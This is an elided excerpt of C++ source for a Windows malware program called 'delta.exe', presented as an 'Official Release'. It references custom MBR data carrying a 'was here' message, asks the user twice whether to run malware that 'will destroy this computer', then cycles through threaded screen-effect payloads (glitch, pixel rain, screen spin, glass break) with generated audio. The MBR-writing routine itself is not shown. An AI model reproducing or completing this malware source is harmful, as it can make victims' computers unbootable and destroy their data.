// delta.exe by VietNamLover - Official Release
...
// ==================== CUSTOM MBR DATA ====================
// Message: "VIETNAMLOVER WAS HERE - DELTA.EXE"
...
VOID WINAPI sound5() {
    ...
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 6 | t << 1) + (t >> 5 | t << 3 | t >> 3) | 
                                      t >> 2 | t << 1);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
...
int main() {
    // Warnings (English)
    if (MessageBoxW(NULL, L"Run Malware?", L"Delta.exe by VietNamLover - Official Release", 
                    MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    if (MessageBoxW(NULL, L"Are you sure? It will destroy this computer", 
                    L"Delta.exe - Last Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    ...
    // Payload 11: Glitch Horizontal
    HANDLE t11 = CreateThread(0, 0, glitchH, 0, 0, 0);
    sound1(); Sleep(30000);
    TerminateThread(t11, 0); CloseHandle(t11);
    InvalidateRect(0, 0, 0);
    
    // Payload 12: Pixel Rain
    HANDLE t12 = CreateThread(0, 0, pixelRain, 0, 0, 0);
    sound2(); Sleep(30000);
    TerminateThread(t12, 0); CloseHandle(t12);
    InvalidateRect(0, 0, 0);
    
    // Payload 13: Screen Spin
    HANDLE t13 = CreateThread(0, 0, screenSpin, 0, 0, 0);
    sound3(); Sleep(30000);
    TerminateThread(t13, 0); CloseHandle(t13);
    InvalidateRect(0, 0, 0);
    
    // Payload 14: Glass Break
    HANDLE t14 = CreateThread(0, 0, glassBreak, 0, 0, 0);
    sound4(); Sleep(30000);
